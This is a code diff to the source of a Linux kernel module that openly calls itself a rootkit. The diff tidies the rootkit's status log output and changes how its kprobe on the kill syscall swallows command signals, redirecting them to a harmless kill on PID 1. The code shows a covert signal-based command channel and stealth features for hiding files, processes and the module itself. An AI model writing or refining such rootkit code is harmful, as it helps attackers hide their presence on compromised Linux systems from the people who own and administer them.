@@ -177,15 +177,15 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
     case CMD_STATUS:
       pr_info("[rootkit][status] Current state log:");
       status = file_hide_is_active();
-      pr_info("[rootkit][status]    File hiding---------+ %s\n", status ? "ENABLED" : "DISABLED");
+      pr_info("[rootkit][status]    File hiding----------> %s\n", status ? "ENABLED" : "DISABLED");
       status = blocking_active;
-      pr_info("[rootkit][status]    File blocking-------+ %s\n", status ? "ENABLED" : "DISABLED");
+      pr_info("[rootkit][status]    File blocking--------> %s\n", status ? "ENABLED" : "DISABLED");
       /*
       status = module_hidden;
-      pr_info("[rootkit][status]    Module self-hiding--+ %s\n", status ? "ENABLED" : "DISABLED");
+      pr_info("[rootkit][status]    Module self-hiding---> %s\n", status ? "ENABLED" : "DISABLED");
       */
       status = proc_hide_is_active();
-      pr_info("[rootkit][status]    Process hiding------+ %s\n", status ? "ENABLED" : "DISABLED");
+      pr_info("[rootkit][status]    Process hiding-------> %s\n", status ? "ENABLED" : "DISABLED");
       break;
     case CMD_TOGGLE_HIDE:
       schedule_toggle(CMD_TOGGLE_HIDE);
@@ -225,9 +225,9 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
   }
 
   //one always swallows (the signal) 
-  //rewrite to: kill(current->pid, 0) which is harmless
-  //just checks if the process exists
-  user_regs->regs[0] = current->pid; //target = self
+  //rewrite to: kill(1, 0) which is harmless
+  //just checks if the init process exists
+  user_regs->regs[0] = 1; //target = init (always exists)
   user_regs->regs[1] = 0;
 
   return 0;
